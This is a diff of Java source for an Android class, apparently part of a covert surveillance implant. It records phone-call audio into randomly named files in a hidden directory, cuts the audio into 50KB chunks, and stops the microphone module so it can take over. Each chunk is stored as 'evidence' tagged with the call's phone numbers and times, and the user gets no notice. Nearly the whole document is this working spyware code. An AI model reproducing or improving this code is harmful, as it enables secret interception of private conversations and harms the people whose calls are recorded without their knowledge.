@@ -1,33 +1,43 @@
 package com.android.dvci.module.call;
 
-import java.io.File;
-import java.util.HashMap;
+import java.io.IOException;
+import java.util.Date;
 import java.util.concurrent.TimeUnit;
 
 import android.media.MediaRecorder;
-import android.os.Build;
 
 import com.android.dvci.Call;
 import com.android.dvci.Device;
 import com.android.dvci.Status;
 import com.android.dvci.auto.Cfg;
-import com.android.dvci.evidence.Markup;
+import com.android.dvci.file.AutoFile;
 import com.android.dvci.file.Path;
 import com.android.dvci.module.ModuleCall;
 import com.android.dvci.module.ModuleMic;
 import com.android.dvci.util.Check;
+import com.android.dvci.util.DateTime;
+import com.android.dvci.util.Execute;
+import com.android.dvci.util.Utils;
 import com.android.mm.M;
+import android.media.MediaRecorder.OnErrorListener;
+import android.media.MediaRecorder.OnInfoListener;
 
-public class RecordCall {
+public class RecordCall implements OnErrorListener, OnInfoListener {
 	private static final String TAG = "RecordCall";
-	
+	private static final long MAX_FILE_SIZE = 1024 * 50;//50KB
 	static RecordCall singleton;
 	protected static final int CALL_PHONE = 0x0145;
-	private String currentRecordFile;
-	// private Date fromTime;
-	// private String number, model;
-	private int strategy = 0;
-	
+	private static int MAX_NUM_OF_FAILURE = 10;
+
+
+	private AutoFile onGoing_chunk;
+	private Call call;
+	private boolean incoming;
+	private boolean recorder_started=false;
+
+
+	private int numFailures=0;
+
 	public synchronized static RecordCall self() {
 		if (singleton == null) {
 			singleton = new RecordCall();
@@ -37,258 +47,163 @@ public class RecordCall {
 	}
 	
 	private MediaRecorder recorder = null;
-	
 
-	private boolean testStrategy(int audioSource, int outputFormat, int audioEncoder) {
-		// Create dummy file
-		Long ts = Long.valueOf(System.currentTimeMillis());
-		String tmp = ts.toString();
-		String path = Path.hidden() + tmp + ".qzt"; // file .3gp
-		boolean success = false;
+	private void createFile() {
+		if (onGoing_chunk == null) {
+			//onGoing_chunk = new AutoFile(Path.hidden(), Math.abs(Utils.getRandom()) + ".3gpp");
+			onGoing_chunk = new AutoFile(Path.hidden(), Math.abs(Utils.getRandom()) + "");
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (createFile) new file: " + onGoing_chunk.getFile());//$NON-NLS-1$
+			}
+		}
+	}
 
+	private void deleteFile() {
+		if (onGoing_chunk != null && onGoing_chunk.exists()) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (deleteFile) delete file: " + onGoing_chunk.getFile());//$NON-NLS-1$
+			}
+			onGoing_chunk.delete();
+		}
+		onGoing_chunk = null;
+	}
+
+
+	private boolean startRecord() {
+		boolean firstTime = false;
 		if (Cfg.DEBUG) {
-			Check.log(TAG + " (testStrategy): strategy: " + audioSource + " - dummy path: " + path); //$NON-NLS-1$
+			Check.log(TAG + M.e(" startRecord"));
+		}
+		if (recorder == null) {
+			recorder = new MediaRecorder();
+			firstTime = true;
+		}else {
+			if (recorder_started) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + M.e(" startRecord already running..."));
+				}
+
+				if (Cfg.DEBUG) {
+					Check.log(TAG + M.e("...nothing to do"));
+				}
+				return true;
+			}
 		}
 
-		startRecord(audioSource, outputFormat, audioEncoder, path);
-
-		// Utils.sleep(250);
-
-		stopRecord();
-
-		File dummy = new File(path);
-
-		if (dummy.length() > 0) {
-			success = true;
-		}
-
-		dummy.delete();
-		dummy = null;
-
-		return success;
-	}
-	
-
-	private int getStrategyNotYetWorking(ModuleCall module) {
-		Markup markupCallStrategy = new Markup(module);
-		HashMap<Integer, Boolean> strategyMap = null;
-
-		// the markup exists, try to read it
+		recorder.setAudioSource(MediaRecorder.AudioSource.VOICE_CALL);
+		//recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
+		recorder.setOutputFormat(MediaRecorder.OutputFormat.RAW_AMR);
+		recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
+		recorder.setOnErrorListener(this);
+		recorder.setOnInfoListener(this);
+		recorder.setMaxFileSize(MAX_FILE_SIZE);
+		createFile();
+		recorder.setOutputFile(this.onGoing_chunk.getFilename());
 		try {
-			if (markupCallStrategy.isMarkup()) {
-				strategyMap = (HashMap<Integer, Boolean>) markupCallStrategy.readMarkupSerializable();
-			}
-
-			// First time we run, let's try a strategy
-			if (strategyMap == null) {
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (getStrategy): no markup found, testing strategies..."); //$NON-NLS-1$
-				}
-
-				// Start with strategy 1
-				int outputFormat = MediaRecorder.OutputFormat.RAW_AMR;
-				int audioEncoder = MediaRecorder.AudioEncoder.AMR_NB;
-				boolean res;
-
-				strategyMap = new HashMap<Integer, Boolean>();
-
-				res = testStrategy(MediaRecorder.AudioSource.VOICE_CALL, outputFormat, audioEncoder);
-
-				// Strategy 0x04
-				strategyMap.put(MediaRecorder.AudioSource.VOICE_CALL, res);
-
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (getStrategy): strategy 4: " + res); //$NON-NLS-1$
-				}
-
-				if (res == true) {
-					markupCallStrategy.writeMarkupSerializable(strategyMap);
-					return MediaRecorder.AudioSource.VOICE_CALL;
-				}
-
-				// Strategy 0x02
-				res = testStrategy(MediaRecorder.AudioSource.VOICE_UPLINK, outputFormat, audioEncoder);
-
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (getStrategy): strategy 2: " + res); //$NON-NLS-1$
-				}
-
-				strategyMap.put(MediaRecorder.AudioSource.VOICE_UPLINK, res);
-
-				if (res == true) {
-					markupCallStrategy.writeMarkupSerializable(strategyMap);
-					return MediaRecorder.AudioSource.VOICE_UPLINK;
-				}
-
-				// Strategy 0x03
-				res = testStrategy(MediaRecorder.AudioSource.VOICE_DOWNLINK, outputFormat, audioEncoder);
-
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (getStrategy): strategy 3: " + res); //$NON-NLS-1$
-				}
-
-				strategyMap.put(MediaRecorder.AudioSource.VOICE_DOWNLINK, res);
-
-				if (res == true) {
-					markupCallStrategy.writeMarkupSerializable(strategyMap);
-					return MediaRecorder.AudioSource.VOICE_DOWNLINK;
-				}
-
-				// Strategy 0x01
-				res = testStrategy(MediaRecorder.AudioSource.MIC, outputFormat, audioEncoder);
-
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (getStrategy): strategy 1: " + res); //$NON-NLS-1$
-				}
-
-				strategyMap.put(MediaRecorder.AudioSource.MIC, res);
-
-				if (res == true) {
-					markupCallStrategy.writeMarkupSerializable(strategyMap);
-					return MediaRecorder.AudioSource.MIC;
-				}
-
-				markupCallStrategy.writeMarkupSerializable(strategyMap);
-
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (setStrategy): no suitable strategy found"); //$NON-NLS-1$
-				}
-			} else { // Return the winning strategy
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (getStrategy): reading markup"); //$NON-NLS-1$
-				}
-
-				for (Integer i : strategyMap.keySet()) {
-					boolean testedStrategy = strategyMap.get(i);
-
-					if (testedStrategy == true) {
-						// Return the winning strategy
-						if (Cfg.DEBUG) {
-							Check.log(TAG + " (getStrategy): using strategy  " + i); //$NON-NLS-1$
-						}
-						return i;
-					}
-				}
-
-				// Ok we don't have a winning strategy
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (setStrategy): no strategy found in markup"); //$NON-NLS-1$
-				}
-
-				return 0;
-			}
-		} catch (Exception e) {
-			if (Cfg.EXCEPTION) {
-				Check.log(e);
-			}
-
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " Error (setStrategy): " + e);//$NON-NLS-1$
-			}
-		}
-
-		return 0;
-	}
-
-
-
-	private boolean startRecord(int audioSource, int outputFormat, int audioEncoder, String path) {
-		recorder = new MediaRecorder();
-
-		recorder.setAudioSource(audioSource);
-		recorder.setOutputFormat(outputFormat);
-		// REMOVE
-		// recorder.setAudioChannels(1);
-
-		recorder.setAudioEncoder(audioEncoder);
-		recorder.setOutputFile(path);
-
-		try {
-			recorder.prepare();
-			recorder.start();
+			this.recorder.prepare();
+			this.recorder.start();
+			recorder_started = true;
 		} catch (Exception e) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (startRecord) Error: cannot start recording");
+				Check.log(TAG + M.e(" failure to start"));
+				if (Cfg.EXCEPTION) {
+					Check.log(e);
+				}
 			}
-
-			recorder = null;
 			return false;
 		}
-
-		currentRecordFile = path;
+		if (Cfg.DEBUG) {
+			Check.log(TAG + M.e(" running ..."));
+		}
 		return true;
 	}
 
-	private boolean stopRecord() {
+
+	private boolean stopRecorder( ) {
 		if (recorder == null) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (stopRecord): recorder is already null"); //$NON-NLS-1$
 			}
+			return false;
+		}
+		//Execute.execute("chmod 755 " +this.onGoing_chunk);
+		recorder.setOnErrorListener(null);
+		recorder.setOnInfoListener(null);
+		try {
+			if(recorder_started) {
+				recorder.stop();
+				recorder.reset();  // You can reuse the object by going back to setAudioSource() step
+				recorder_started = false;
+			}
+		} catch (Exception ex) {
+			if (Cfg.DEBUG) {
+				Check.log(ex);
+			}
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (stopRecord) resetting recorder");
+				numFailures += 1;
+			}
+		}finally {
+			if (this.onGoing_chunk == null || !this.onGoing_chunk.exists()) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (saveRecorderEvidence) Error: out_file not available");
 
+				}
+				numFailures += 1;
+			} else {
+				//String myNumber = Device.self().getPhoneNumber();
+				ModuleCall.saveCallEvidence(call.getFrom(), call.getTo(), incoming, call.getTimeBegin(), call.isComplete()?call.getTimeEnd():new Date(),
+						onGoing_chunk.getFilename(), call.isComplete(), 1, CALL_PHONE);
+				//deleteFile();
+				//saveRecorderEvidence();
+			}
+		}
+
+
+		return true;
+	}
+
+	public boolean isSupported() {
+		return true;
+	}
+	public boolean stopCall(){
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (stopCall) called");
+		}
+		try {
+			stopRecorder();
+			if (recorder != null) {
+				recorder.release();
+			}
+			if (ModuleCall.isMicAvailable()) {
+				ModuleMic.self().resetBlacklist();
+			}
+		}catch (Exception e){
+			if (Cfg.DEBUG) {
+				Check.log(TAG + M.e(" (stopCall) failure to stop"));
+				if (Cfg.EXCEPTION) {
+					Check.log(e);
+				}
+			}
+		}finally {
+
+			recorder = null;
+			call = null;
+
+		}
+		return true;
+	}
+
+	public boolean recordCall( final Call call, final boolean incoming) {
+		if(numFailures>MAX_NUM_OF_FAILURE){
+			//module.recordFlag = false;
 			return false;
 		}
 
-		recorder.stop();
-		recorder.release();
-		recorder = null;
-		return true;
-	}
-	
-	public boolean isSupported(ModuleCall module) {
-		String model = Build.MODEL.toLowerCase();
-		boolean supported = false;
-
-		if (Cfg.DEBUG) {
-			Check.log(TAG + " (isSupported): phone model: " + model); //$NON-NLS-1$
-		}
-		// TODO: in Messages
-		if (model.contains(M.e("i9100"))) { // Samsung Galaxy S2
-			supported = true;
-			strategy = MediaRecorder.AudioSource.VOICE_UPLINK;
-
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (notification): Samsung Galaxy S2, supported"); //$NON-NLS-1$
-			}
-		} else if (model.contains(M.e("galaxy nexus"))) { // Samsung Galaxy
-															// Nexus
-			supported = true;
-			strategy = MediaRecorder.AudioSource.DEFAULT;
-
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (notification): Galaxy Nexus, supported only microphone"); //$NON-NLS-1$
-			}
-		} else if (model.contains(M.e("gt-i9300"))) { // Galaxy S3
-			supported = true;
-			strategy = MediaRecorder.AudioSource.VOICE_UPLINK;
-
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (notification): Galaxy S3, supported"); //$NON-NLS-1$
-			}
-		} else if (model.contains(M.e("xt910"))) { // Motorola xt-910
-			supported = false;
-
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (notification): Motorola xt-910, unsupported"); //$NON-NLS-1$
-			}
-		} else if (model.contains(M.e("gt-p1000"))) { // Samsung Galaxy Tab 7''
-			supported = true;
-			strategy = MediaRecorder.AudioSource.VOICE_UPLINK;
-
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (notification): Samsung Galaxy Tab 7'',  supported"); //$NON-NLS-1$
-			}
-		} else {
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (notification): model unsupported by call registration module"); //$NON-NLS-1$
-			}
-		}
-
-		module.recordFlag = supported;
-		return supported;
-	}
-	
-	public boolean recordCall(final ModuleCall module, final Call call, final boolean incoming) {
-		if (!call.isOngoing()) {
+		if (this.recorder == null) {
+			this.call = call;
+			this.incoming = incoming;
+			/*
 			if (stopRecord()) {
 				Object future = Status.getStpe().schedule(new Runnable() {
 					public void run() {
@@ -296,61 +211,65 @@ public class RecordCall {
 						module.saveCallEvidence(call.getNumber(), myNumber, incoming, call.getTimeBegin(), call.getTimeEnd(),
 								currentRecordFile, true, 1, CALL_PHONE);
 					}
-				}, 100, TimeUnit.MILLISECONDS);
-
-				// Se un giorno la conf non dovesse includere gia' tutti
-				// i moduli,
-				// self() tornerebbe NULL in quanto non instanziato.
-				ModuleMic mic = ModuleMic.self();
-
-				if (mic != null) {
-					mic.resume();
-				}
+				}, 100, TimeUnit.MILLISECONDS);e
 			}
-
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (notification): call finished"); //$NON-NLS-1$
 			}
-
 			return true;
-		}
-
-		if (Cfg.DEBUG) {
-			Check.log(TAG + " (notification): start call recording procedure..."); //$NON-NLS-1$
-		}
-
-		int outputFormat = MediaRecorder.OutputFormat.RAW_AMR;
-		int audioEncoder = MediaRecorder.AudioEncoder.AMR_NB;
-
-		Long ts = Long.valueOf(System.currentTimeMillis());
-		String tmp = ts.toString();
-
-		// Logfile .3gpp in chiaro, temporaneo
-		String path = Path.hidden() + tmp + M.e(".qzt");
-
-		ModuleMic mic = ModuleMic.self();
-
-		if (mic != null) {
-			mic.suspend();
-		}
-
-		if (startRecord(strategy, outputFormat, audioEncoder, path) == true) {
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (notification): recording started on file: " + path); //$NON-NLS-1$
+			*/
+			if (ModuleCall.isMicAvailable()) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (recordCall) can't register call because mic is on:stopping it");
+				}
+				ModuleMic.self().stop();
 			}
 
-		} else {
-			module.recordFlag = false;
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (notification): start call recording procedure..."); //$NON-NLS-1$
+			}
 		}
+		if (startRecord() == true) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (notification): recording started on file: " + onGoing_chunk.getName()); //$NON-NLS-1$
+			}
 
-		mic = ModuleMic.self();
-
-		if (mic != null) {
-			mic.resume();
 		}
-
-		return false;
+		return true;
+	}
+	public void onInfo(MediaRecorder mr, int what, int extra) {
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (onInfo): " + what);//$NON-NLS-1$
+		}
+		/*
+		After recording reaches the specified filesize, a notification will be sent to the MediaRecorder.OnInfoListener with a "what"
+		code of MEDIA_RECORDER_INFO_MAX_FILESIZE_REACHED
+		and recording will be stopped.
+		Stopping happens asynchronously, there is no guarantee that the recorder will
+		have stopped by the time the listener is notified.
+		*/
+		if (what == MediaRecorder.MEDIA_RECORDER_INFO_MAX_FILESIZE_REACHED) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (onInfo): max Size reached, saving file");//$NON-NLS-1$
+			}
+			stopRecorder();
+			try {
+				if(call!=null && !call.isComplete()) {
+					startRecord();
+				}
+			} catch (Exception e) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (onInfo): exception restarting Mic");//$NON-NLS-1$
+				}
+			}
+		}
 	}
 
+	public void onError(MediaRecorder mr, int what, int extra) {
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (onError) Error: " + what);//$NON-NLS-1$
+		}
+		stopCall();
+	}
 
 }
